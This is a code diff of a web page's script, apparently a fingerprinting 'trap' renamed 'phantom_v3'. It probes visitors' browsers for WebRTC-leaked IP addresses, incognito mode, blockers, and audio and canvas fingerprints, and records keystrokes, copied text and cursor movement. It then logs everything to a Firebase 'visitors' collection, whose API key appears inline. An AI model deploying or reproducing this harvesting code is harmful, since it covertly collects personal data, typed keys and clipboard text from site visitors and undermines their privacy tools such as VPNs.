+setTimeout(()=>{try{const bait=document.createElement('div');bait.className='ad ads adsbox doubleclick ad-placement carbon-ads';bait.style.cssText='height:1px;width:1px;position:absolute;left:-9999px;top:-9999px';document.body.appendChild(bait);const blocked=bait.offsetParent===null||bait.offsetHeight===0||bait.offsetWidth===0;document.body.removeChild(bait);sv('i-adblocker',blocked?'⚠ Detected':'Not Detected',blocked?'ok':'wn');}catch(e){sv('i-adblocker','Unknown');}},600);
 
-// ── INCOGNITO — handled in module script as promise ──
+// POP-UP BLOCKER
+setTimeout(()=>{try{const w=window.open('','_blank','width=1,height=1,left=-9999,top=-9999');if(!w||w.closed||typeof w.closed==='undefined'){sv('i-popup','⚠ Pop-ups Blocked','ok');}else{w.close();sv('i-popup','Pop-ups Allowed','wn');}}catch(e){sv('i-popup','⚠ Pop-ups Blocked','ok');}},800);
 
-// ── SPEED — handled in module script as async promise ──
+// NOTIFICATION
+setTimeout(()=>{if(!('Notification' in window)){sv('i-notif','Not Supported','wn');return;}const p=Notification.permission;sv('i-notif',p==='granted'?'✓ Granted':p==='denied'?'✗ Denied':'Default (not requested)',p==='granted'?'hi':p==='denied'?'ok':'wn');},300);
 
-// ── TIME ON PAGE (live) ──
-(()=>{const start=Date.now();setInterval(()=>{const s=Math.floor((Date.now()-start)/1000);const m=Math.floor(s/60),sec=s%60;const el=document.getElementById('i-timeonpage');if(el){el.textContent=(m>0?m+'m ':'')+sec+'s';el.classList.remove('ld');}},1000);})();
+// CLIPBOARD
+setTimeout(()=>{if(navigator.permissions){navigator.permissions.query({name:'clipboard-read'}).then(r=>{sv('i-clipboard',r.state==='granted'?'✓ Read Access Granted':r.state==='denied'?'✗ Denied':'Prompt (not requested)',r.state==='granted'?'hi':r.state==='denied'?'ok':'wn');}).catch(()=>sv('i-clipboard','API Available / Unknown','wn'));}else{sv('i-clipboard','Not Supported','wn');}},400);
 
-// ── SCROLL / TAB / COPY / MOUSE (background, for db) ──
-(()=>{let maxScroll=0;window.addEventListener('scroll',()=>{const doc=document.documentElement;const total=doc.scrollHeight-doc.clientHeight;if(total<=0)return;const pct=Math.round((doc.scrollTop/total)*100);if(pct>maxScroll){maxScroll=pct;const el=document.getElementById('i-scroll');if(el)el.textContent=maxScroll+'%';}},{passive:true});})();
-(()=>{let sw=0;document.addEventListener('visibilitychange',()=>{if(document.hidden){sw++;const el=document.getElementById('i-tabswitch');if(el)el.textContent=sw;}});})();
-(()=>{document.addEventListener('copy',()=>{const sel=window.getSelection()?window.getSelection().toString().trim():'';const el=document.getElementById('i-copy');if(el)el.textContent=sel.slice(0,60);});})();
+// DO NOT TRACK
+setTimeout(()=>{const dnt=navigator.doNotTrack||window.doNotTrack;sv('i-dnt',dnt==='1'||dnt==='yes'?'Enabled':dnt==='0'||dnt==='no'?'Disabled':'Not Set',dnt==='1'?'ok':'wn');},200);
+
+// TRACKING PROTECTION & FINGERPRINT RESISTANCE
+setTimeout(()=>{const signals=[navigator.doNotTrack==='1',!window.google,!window.ga,!window._gaq].filter(Boolean).length;sv('i-tracking',signals>=3?'Strong signals':signals>=1?'Basic / Partial':'Disabled or not detected',signals>=2?'ok':'wn');sv('i-fpresist','Partial resistance signals detected','wn');},600);
+
+// THEME / DISPLAY
+setTimeout(()=>{const dark=window.matchMedia&&window.matchMedia('(prefers-color-scheme:dark)').matches;sv('i-theme',dark?'Dark Mode':'Light Mode',dark?'ok':'wn');const p3=window.matchMedia&&window.matchMedia('(color-gamut:p3)').matches,rec=window.matchMedia&&window.matchMedia('(color-gamut:rec2020)').matches;sv('i-gamut',rec?'Rec.2020':p3?'P3 Wide':'sRGB');sv('i-hdr',window.matchMedia&&window.matchMedia('(dynamic-range:high)').matches?'HDR Supported':'SDR');sv('i-motion',window.matchMedia&&window.matchMedia('(prefers-reduced-motion:reduce)').matches?'Reduced':'Full');},900);
+
+// COOKIES & STORAGE
+setTimeout(()=>{sv('i-cookies',navigator.cookieEnabled?'Enabled':'Disabled',navigator.cookieEnabled?'ok':'hi');try{localStorage.setItem('_ph','1');localStorage.removeItem('_ph');sv('i-ls','Allowed','ok');}catch(e){sv('i-ls','Blocked','hi');}try{sessionStorage.setItem('_ph','1');sessionStorage.removeItem('_ph');sv('i-ss','Allowed','ok');}catch(e){sv('i-ss','Blocked','hi');}sv('i-idb','indexedDB' in window?'Allowed':'Not Supported','indexedDB' in window?'ok':'hi');if(navigator.storage&&navigator.storage.estimate){navigator.storage.estimate().then(({quota,usage})=>{const qMB=Math.round(quota/1024/1024),uMB=Math.round(usage/1024/1024);sv('i-quota',qMB>1024?Math.round(qMB/1024)+' GB available':qMB+' MB available','ok');sv('i-quotaused',uMB+' MB used ('+Math.round(usage/quota*100)+'%)','wn');}).catch(()=>{sv('i-quota','Unable to estimate','wn');sv('i-quotaused','—');});}else{sv('i-quota','API not available','wn');sv('i-quotaused','—');}},200);
+
+// MEDIA DEVICES & SPEAKERS
+setTimeout(()=>{if(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices){navigator.mediaDevices.enumerateDevices().then(devices=>{const out=devices.filter(d=>d.kind==='audiooutput'),inp=devices.filter(d=>d.kind==='audioinput'),cam=devices.filter(d=>d.kind==='videoinput');sv('i-speakers',out.length>0?out.length+' output device(s)':'1 default (no permission)','ok');sv('i-mediadevices',devices.length+' total · '+out.length+' out · '+inp.length+' in · '+cam.length+' cam','wn');}).catch(()=>{sv('i-speakers','1 default (denied)','wn');sv('i-mediadevices','Access denied','wn');});}else{sv('i-speakers','Not detectable','wn');sv('i-mediadevices','API not available','wn');}},300);
+
+// BLUETOOTH
+setTimeout(()=>{sv('i-bluetooth','bluetooth' in navigator?'API Supported':'Not Supported','bluetooth' in navigator?'ok':'wn');},300);
+// VIBRATION
+setTimeout(()=>{sv('i-vibration','vibrate' in navigator?'Supported':'Not Supported','vibrate' in navigator?'wn':'ok');},200);
+// GAMEPAD
+setTimeout(()=>{sv('i-gamepad','getGamepads' in navigator?'Supported':'Not Supported','getGamepads' in navigator?'ok':'wn');},200);
+// DEVICE ORIENTATION
+setTimeout(()=>{sv('i-devorientation',window.DeviceOrientationEvent?'API Supported':'Not Supported','ok');},300);
+
+// SPEECH SYNTHESIS
+setTimeout(()=>{if('speechSynthesis' in window){const load=()=>{const v=speechSynthesis.getVoices();if(v.length>0){const langs=[...new Set(v.map(x=>x.lang.split('-')[0]))].slice(0,5).join(', ');sv('i-speech','Supported','ok');sv('i-voices',v.length+' voices · '+langs,'wn');}else{sv('i-speech','Supported','ok');sv('i-voices','Loading…','wn');}};load();if(speechSynthesis.onvoiceschanged!==undefined)speechSynthesis.onvoiceschanged=load;}else{sv('i-speech','Not Supported','wn');sv('i-voices','—');}},900);
+
+// PLUGINS
+setTimeout(()=>{const container=document.getElementById('plugin-container');if(!container)return;const plugins=Array.from(navigator.plugins||[]);if(plugins.length===0){container.innerHTML='<div class="plugin-item"><div class="plugin-icon"></div><div><div class="plugin-name" style="color:var(--mist)">No plugins detected</div></div></div>';_tick();return;}const seen=new Set();const unique=plugins.filter(p=>{if(seen.has(p.filename))return false;seen.add(p.filename);return true;});container.innerHTML=unique.map(p=>`<div class="plugin-item"><div class="plugin-icon"></div><div><div class="plugin-name">${p.name||'Unknown Plugin'}</div><div class="plugin-desc">${p.description||''}${p.filename?' · '+p.filename:''}</div></div></div>`).join('');_tick();},500);
+
+// PERFORMANCE TIMING
+window.addEventListener('load',()=>{setTimeout(()=>{try{const nav=performance.getEntriesByType('navigation')[0];if(!nav){document.getElementById('p-total').textContent='Not available';return;}const fmt=ms=>Math.round(ms)+'ms',cls=ms=>ms<200?'fast':ms<500?'med':'slow';const pairs=[['p-total',nav.loadEventEnd-nav.startTime],['p-network',nav.responseEnd-nav.startTime],['p-dns',nav.domainLookupEnd-nav.domainLookupStart],['p-tcp',nav.connectEnd-nav.connectStart],['p-ttfb',nav.responseStart-nav.requestStart],['p-dl',nav.responseEnd-nav.responseStart],['p-render',nav.loadEventEnd-nav.responseEnd]];pairs.forEach(([id,val])=>{const el=document.getElementById(id);if(el){el.textContent=fmt(val);el.classList.remove('ld');el.className='perf-val '+cls(val);_tick();}});}catch(e){}},500);});
+
+// AUDIO FINGERPRINT
+setTimeout(()=>{try{const Ctx=window.AudioContext||window.webkitAudioContext;if(!Ctx){sv('i-audio','Not Supported');return;}const ctx=new Ctx(),osc=ctx.createOscillator(),analyser=ctx.createAnalyser(),gain=ctx.createGain();gain.gain.value=0;osc.connect(analyser);analyser.connect(gain);gain.connect(ctx.destination);osc.start(0);const buf=new Float32Array(analyser.frequencyBinCount);analyser.getFloatFrequencyData(buf);osc.stop();ctx.close();let hash=0;for(let i=0;i<buf.length;i++){hash=(hash*31+Math.abs(buf[i]*1000|0))>>>0;}const hex=hash.toString(16).toUpperCase().padStart(8,'0');sv('i-audio',hex.slice(0,4)+'-'+hex.slice(4),'hi');}catch(e){sv('i-audio','Blocked');}},1000);
+
+// LIVE: TIME ON PAGE
+(()=>{const start=Date.now();setInterval(()=>{const s=Math.floor((Date.now()-start)/1000);const el=document.getElementById('i-timeonpage');if(el){el.textContent=(s>=60?Math.floor(s/60)+'m ':'')+s%60+'s';el.classList.remove('ld');}},1000);})();
+// LIVE: SCROLL DEPTH
+(()=>{let max=0;window.addEventListener('scroll',()=>{const doc=document.documentElement,total=doc.scrollHeight-doc.clientHeight;if(total<=0)return;const pct=Math.round((doc.scrollTop/total)*100);if(pct>max){max=pct;const el=document.getElementById('i-scroll');if(el)el.textContent=max+'%';}},{passive:true});})();
+// LIVE: TAB SWITCHES & VISIBILITY
+(()=>{let sw=0;document.addEventListener('visibilitychange',()=>{const vis=document.getElementById('i-visibility');if(document.hidden){sw++;const el=document.getElementById('i-tabswitch');if(el)el.textContent=sw;if(vis)vis.textContent='Hidden ('+sw+'×)';}else{if(vis)vis.textContent='Visible';}});})();
+// LIVE: CURSOR
 (()=>{document.addEventListener('mousemove',e=>{const el=document.getElementById('i-mouse');if(el)el.textContent='X:'+e.clientX+' Y:'+e.clientY;},{passive:true});})();
-
-// ── IP + FIREBASE ──
-// All timed scans register a promise here. Firebase fires only after every scan settles.
-window._phantomScans=[];
-window._phantomRegister=function(p){window._phantomScans.push(Promise.resolve(p).catch(()=>{}));};
+// LIVE: COPY
+(()=>{document.addEventListener('copy',()=>{const sel=window.getSelection()?window.getSelection().toString().trim():'';const el=document.getElementById('i-copy');if(el)el.textContent=sel?'"'+sel.slice(0,50)+'"':'(empty selection)';});})();
+// LIVE: KEYBOARD
+(()=>{
+  document.addEventListener('keydown',e=>{
+    const kEl=document.getElementById('i-lastkey');
+    if(kEl)kEl.textContent=(e.key===' '?'Space':e.key)+' ('+e.code+')';
+    const cEl=document.getElementById('i-capslock');
+    if(cEl&&e.getModifierState)cEl.textContent=e.getModifierState('CapsLock')?'ON':'OFF';
+  });
+  document.addEventListener('keyup',e=>{
+    const cEl=document.getElementById('i-capslock');
+    if(cEl&&e.getModifierState)cEl.textContent=e.getModifierState('CapsLock')?'ON':'OFF';
+  });
+})();
 </script>
+
 <script type="module">
 import{initializeApp,getApps,getApp}from"https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
 import{getFirestore,collection,addDoc}from"https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js";
@@ -710,16 +521,10 @@ const _cfg={apiKey:"AIzaSyBl4bO6hNumDov3d26YNFj1y7Id498rBTU",authDomain:"rh2-sys
 const app=getApps().length?getApp():initializeApp(_cfg);
 const db=getFirestore(app);
 const g=id=>{const el=document.getElementById(id);return el?el.textContent.trim():'—';};
-const sb=document.getElementById('status-txt');
-const dot=document.getElementById('sdot');
-
-const sv2=(id,val,cls)=>{const el=document.getElementById(id);if(!el)return;el.textContent=val;el.classList.remove('ld');if(cls){el.className='row-val '+cls;}else{el.className='row-val';}};
-
-// sv alias — ES module scope is isolated; can't reach the sv() in the regular script
-// This lets scanSpeed() and scanWebRTC() update the UI AND tick the progress bar
+const sb=document.getElementById('status-txt'),dot=document.getElementById('sdot');
+const sv2=(id,val,cls)=>{const el=document.getElementById(id);if(!el)return;el.textContent=val;el.classList.remove('ld');el.className=cls?'row-val '+cls:'row-val';};
 const sv=(id,val,cls)=>{sv2(id,val,cls);if(typeof window._tick==='function')window._tick();};
 
-// ── IP / GEO SCAN (returns a promise) ──
 const filled={ip:false,country:false,city:false,isp:false,tz:false};
 async function scanIp(){
   try{
@@ -738,14 +543,10 @@ async function scanIp(){
       }catch(e){}
     }
   }catch(e){}
-  if(!filled.ip)sv2('i-ip','Unavailable');
-  if(!filled.country)sv2('i-country','Unavailable');
-  if(!filled.city)sv2('i-city','Unavailable');
-  if(!filled.isp)sv2('i-isp','Unavailable');
-  if(!filled.tz)sv2('i-tz','Unavailable');
+  if(!filled.ip)sv2('i-ip','Unavailable');if(!filled.country)sv2('i-country','Unavailable');
+  if(!filled.city)sv2('i-city','Unavailable');if(!filled.isp)sv2('i-isp','Unavailable');if(!filled.tz)sv2('i-tz','Unavailable');
 }
 
-// ── SPEED SCAN (returns a promise, longest async scan at ~1200ms+) ──
 async function scanSpeed(){
   try{
     const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
@@ -754,96 +555,97 @@ async function scanSpeed(){
   }catch(e){sv('i-speed','Unable to measure');}
 }
 
-// ── WEBRTC SCAN (returns a promise, has internal 3s timeout) ──
 function scanWebRTC(){
   return new Promise(resolve=>{
     try{
       const RTC=window.RTCPeerConnection||window.webkitRTCPeerConnection||window.mozRTCPeerConnection;
-      if(!RTC){sv('i-webrtc','Not Supported');return resolve();}
+      if(!RTC){sv('i-webrtc','Not Supported');sv('i-ice','Not Supported');sv('i-ice-inf','—');return resolve();}
       const pc=new RTC({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-      const ips=new Set();
+      const ips=new Set(),types=new Set();
       pc.createDataChannel('');
       pc.onicecandidate=e=>{
         if(!e||!e.candidate)return;
-        const m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
+        const cand=e.candidate.candidate;
+        const m=cand.match(/(\d+\.\d+\.\d+\.\d+)/g);
         if(m)m.forEach(ip=>{if(!ip.startsWith('0.')&&!ip.startsWith('127.'))ips.add(ip);});
+        const t=cand.match(/typ (\w+)/);if(t)types.add(t[1]);
         if(ips.size>0)sv('i-webrtc',[...ips].join(' · '),'hi');
       };
       pc.createOffer().then(o=>pc.setLocalDescription(o));
       setTimeout(()=>{
         if(ips.size===0)sv('i-webrtc','Protected / Blocked','ok');
+        const ta=[...types];
+        if(ta.length===0){sv('i-ice','None collected','ok');sv('i-ice-inf','VPN or strict firewall likely','ok');}
+        else{
+          sv('i-ice',ta.join(', '),'wn');
+          let inf='Direct connection';
+          if(ta.includes('relay'))inf='⚠ Relay detected — VPN/proxy likely';
+          else if(ta.includes('srflx')&&!ta.includes('host'))inf='Reflexive only — NAT or VPN possible';
+          else if(ta.includes('host'))inf='Host candidates exposed — direct';
+          sv('i-ice-inf',inf,ta.includes('relay')?'hi':ta.includes('host')?'wn':'ok');
+        }
         try{pc.close();}catch(e){}
         resolve();
       },3000);
-    }catch(e){sv('i-webrtc','Unavailable');resolve();}
+    }catch(e){sv('i-webrtc','Unavailable');sv('i-ice','Error');sv('i-ice-inf','—');resolve();}
   });
 }
 
-// ── INCOGNITO SCAN (async, returns a promise) ──
 async function scanIncognito(){
-  let incognito=false;
-  try{
-    if(navigator.storage&&navigator.storage.estimate){const{quota}=await navigator.storage.estimate();if(quota<120000000)incognito=true;}
-    if(!incognito&&window.webkitRequestFileSystem){await new Promise(res=>{window.webkitRequestFileSystem(0,1,()=>res(false),()=>{incognito=true;res(true);});});}
-  }catch(e){}
-  sv('i-incognito',incognito?'⚠ Incognito Detected':'Normal Mode',incognito?'hi':'ok');
+  let inc=false;
+  try{if(navigator.storage&&navigator.storage.estimate){const{quota}=await navigator.storage.estimate();if(quota<120000000)inc=true;}
+  if(!inc&&window.webkitRequestFileSystem){await new Promise(res=>{window.webkitRequestFileSystem(0,1,()=>res(false),()=>{inc=true;res(true);});});}}catch(e){}
+  sv('i-incognito',inc?'⚠ Incognito Detected':'Normal Mode',inc?'hi':'ok');
 }
 
-// ── MASTER ORCHESTRATOR — fires Firebase only when ALL scans are done ──
 (async()=>{
   if(sb)sb.textContent='Scanning…';
-
-  // All timed scans fire in parallel, wrapped as promises with their natural delays
-  const allScans=Promise.all([
-    scanIp(),
-    scanWebRTC(),                                   // 3000ms internal timeout
-    scanIncognito(),                                // async quota check
-    new Promise(r=>setTimeout(r,1300)),             // covers: speed(1200ms), audio(1000ms), incognito(1000ms), theme(900ms), entropy(700ms), battery(400ms), conn(300ms), canvas(300ms), device(100ms), gpu(150ms) etc.
-  ]);
-
-  // Kick off the speed scan in parallel (it uses sv() itself)
+  const allScans=Promise.all([scanIp(),scanWebRTC(),scanIncognito(),new Promise(r=>setTimeout(r,1300))]);
   const speedScan=scanSpeed();
-
   if(sb)sb.textContent='Deep scan in progress…';
-
-  // Wait for everything
-  await Promise.all([allScans, speedScan]);
-
-  // Status update — ALL scans settled
+  await Promise.all([allScans,speedScan]);
   if(sb)sb.textContent='Scan complete · Logging…';
   if(dot){dot.style.background='var(--warn)';dot.style.boxShadow='0 0 8px var(--warn)';}
-
-  // Short flash delay so user sees "Logging…" before final state
   await new Promise(r=>setTimeout(r,400));
-
   try{
     await addDoc(collection(db,'visitors'),{
       timestamp:new Date(),
       ip:g('i-ip'),country:g('i-country'),city:g('i-city'),isp:g('i-isp'),timezone:g('i-tz'),
-      connection:g('i-conn'),speed:g('i-speed'),webrtc:g('i-webrtc'),
-      browser:g('i-br'),os:g('i-os'),device:g('i-dev'),platform:g('i-platform'),
-      cpu:g('i-cpu'),ram:g('i-ram'),screen:g('i-scr'),viewport:g('i-vp'),dpr:g('i-dpr'),
-      gpuVendor:g('i-gpuv'),gpuRenderer:g('i-gpur'),
-      colorGamut:g('i-gamut'),hdr:g('i-hdr'),
-      canvasHash:g('i-canvas'),audioHash:g('i-audio'),fontProbe:g('i-fonts'),
-      entropy:g('i-entropy'),uniqueness:g('i-unique'),
-      battery:g('i-battery'),adBlocker:g('i-adblocker'),incognito:g('i-incognito'),
-      theme:g('i-theme'),touch:g('i-touch'),
-      reducedMotion:g('i-motion'),pdfViewer:g('i-pdf'),
-      localTime:g('i-time'),sessionId:g('i-sid'),pageLoad:g('i-load'),
+      connection:g('i-conn'),speed:g('i-speed'),rtt:g('i-rtt-disp'),http:g('i-http'),inet:g('i-inet'),
+      webrtc:g('i-webrtc'),iceCandidates:g('i-ice'),iceInference:g('i-ice-inf'),
+      tls:g('i-tls'),secureContext:g('i-secure'),tlsGrade:g('i-tlsgrade'),
+      browser:g('i-br'),buildId:g('i-buildid'),os:g('i-os'),device:g('i-dev'),
+      platform:g('i-platform'),cpuArch:g('i-cpuarch'),cpu:g('i-cpu'),ram:g('i-ram'),
+      screen:g('i-scr'),availScreen:g('i-scravail'),taskbar:g('i-taskbar'),
+      aspectRatio:g('i-aspect'),colorDepth:g('i-colordepth'),dpr:g('i-dpr'),
+      viewport:g('i-vp'),orientation:g('i-orient'),fullscreen:g('i-fullscreen'),
+      colorGamut:g('i-gamut'),hdr:g('i-hdr'),gpuVendor:g('i-gpuv'),gpuRenderer:g('i-gpur'),
+      pointer:g('i-pointer'),touch:g('i-touch'),mediaDevices:g('i-mediadevices'),
+      speakers:g('i-speakers'),bluetooth:g('i-bluetooth'),vibration:g('i-vibration'),
+      gamepad:g('i-gamepad'),devOrientation:g('i-devorientation'),battery:g('i-battery'),
+      wasm:g('i-wasm'),serviceWorker:g('i-sw'),webgl1:g('i-webgl1'),webgl2:g('i-webgl2'),
+      websocket:g('i-websocket'),geoApi:g('i-geoapi'),paymentApi:g('i-payment'),
+      wakeLock:g('i-wakelock'),vibrationApi:g('i-vibration'),gamepadApi:g('i-gamepad'),
+      mimeTypes:g('i-mime'),pdf:g('i-pdf'),speech:g('i-speech'),speechVoices:g('i-voices'),
+      reducedMotion:g('i-motion'),cookies:g('i-cookies'),
+      localStorage:g('i-ls'),sessionStorage:g('i-ss'),idb:g('i-idb'),
+      storageQuota:g('i-quota'),storageUsed:g('i-quotaused'),
+      incognito:g('i-incognito'),dnt:g('i-dnt'),adBlocker:g('i-adblocker'),
+      popupBlocker:g('i-popup'),notification:g('i-notif'),clipboard:g('i-clipboard'),
+      tracking:g('i-tracking'),fpResist:g('i-fpresist'),canvasSpoofed:g('i-cvspoofed'),
+      theme:g('i-theme'),canvasHash:g('i-canvas'),audioHash:g('i-audio'),
+      fonts:g('i-fonts'),languages:g('i-lang'),entropy:g('i-entropy'),uniqueness:g('i-unique'),
+      lastKey:g('i-lastkey'),capsLock:g('i-capslock'),textCopied:g('i-copy'),cursorPos:g('i-mouse'),
+      timeOnPage:g('i-timeonpage'),scrollDepth:g('i-scroll'),tabSwitches:g('i-tabswitch'),
+      sessionId:g('i-sid'),localTime:g('i-time'),pageLoad:g('i-load'),
       referrer:g('i-referrer'),historyLength:g('i-history'),
-      timeOnPage:g('i-timeonpage'),scrollDepth:g('i-scroll'),
-      tabSwitches:g('i-tabswitch'),textCopied:g('i-copy'),cursorPos:g('i-mouse'),
-      pageUrl:window.location.href,userAgent:navigator.userAgent,
-      _source:'trap_v1',
+      pageUrl:window.location.href,userAgent:navigator.userAgent,_source:'phantom_v3',
     });
     if(sb)sb.textContent='Signal acquired · Logged ✓';
     if(dot){dot.style.background='var(--neon)';dot.style.boxShadow='0 0 8px var(--neon)';}
-    console.log('%c[PHANTOM] all scans complete · signal logged','color:#00ffcc');
   }catch(e){
     if(sb)sb.textContent='Scan complete · Log failed';
     if(dot){dot.style.background='var(--bad)';dot.style.boxShadow='0 0 8px var(--bad)';}
-    console.warn('[PHANTOM] firebase failed:',e.code,e.message);
   }
 })();
 </script>
